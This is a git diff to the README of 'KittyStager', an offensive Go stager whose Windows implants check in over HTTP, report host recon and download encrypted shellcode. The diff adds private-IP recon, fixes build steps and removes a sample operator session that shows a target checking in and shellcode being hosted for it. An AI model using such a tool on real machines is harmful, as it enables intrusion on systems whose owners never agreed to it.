@@ -19,6 +19,7 @@ KittyStager has :
 - A basic recon to get some information about the target
   - The hostname (used to cypher the shellcode)
   - The username
+  - The private IP
   - The program file content
 - An AES encryption to encrypt the shellcode with a none hardcoded key
 
@@ -46,14 +47,14 @@ KittyStager has :
 4. Run the kitten
 5. Host the shellcode for the kitten
 
-![](/img/workfow.svg)
+![](/img/workflow.svg)
 
 ## Quick start
 The kittens are for windows only, but the server can be run on any OS.
 
 How to compile :
 ```
-go build cmd/kitten/
+go build
 ./kittyStager
 
 cd /kitten/basickitten
@@ -88,50 +89,16 @@ Http:
     - "kitten/bananaKitten/"
 ```
 ### Example
-```
-~kittyStager ❯.\kittyStager.exe -p path/to/config/file
-                     _
-                    / )
-                   ( (
-     A.-.A  .-""-.  ) )
-    / , , \/      \/ /
-   =\  t  ;=    /   /
-     `--,'  .""|   /
-         || |  \\ \
-        ((,_|  ((,_\
+KittyStager :
+![](/img/kitty16.png)
+![](/img/kitty17.png)
+![](/img/kitty10.png)
+![](/img/kitty11.png)
+![](/img/kitty12.png)
+![](/img/kitty18.png)
+![](/img/kitty13.png)
 
-KittyStager - A simple stager written in Go
-
-[+] Config loaded
-[+] Generated conf file for C:\Users\enelg\KittyStager\kitten\basicKitten
-[+] Generated conf file for C:\Users\enelg\KittyStager\kitten\bananaKitten
-[+] Config file generated
-[+] Starting http server
-[+] Sleep set to 5s on all targets
-[+] Started http server on 127.0.0.1:8080
-
-KittyStager 🐈❯
-[+] Request from: 127.0.0.1
-[+] User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/102.0
-[+] Hostname: TARGET
-[+] Username: target
-[+] To get more, use the recon 
-
-KittyStager 🐈❯ interact
-[*] Targets:
-0 - all targets
-1 - 127.0.0.1
-
-[*] Please enter the id of the target
-id: 1
-
-KittyStager - 127.0.0.1 🐈❯ shellcode
-[*] Please enter the path to the shellcode
-Path: shellcode\shellcode.bin
-[+] Key generated is : TARGETTARGETTARGETTARGETTARGET
-[+] Shellcode hosted for 127.0.0.1 
-```
-It also works with donuts shellcodes
+Kitten :
 ```
 ~basicKitten ❯ .\basicKitten.exe
 
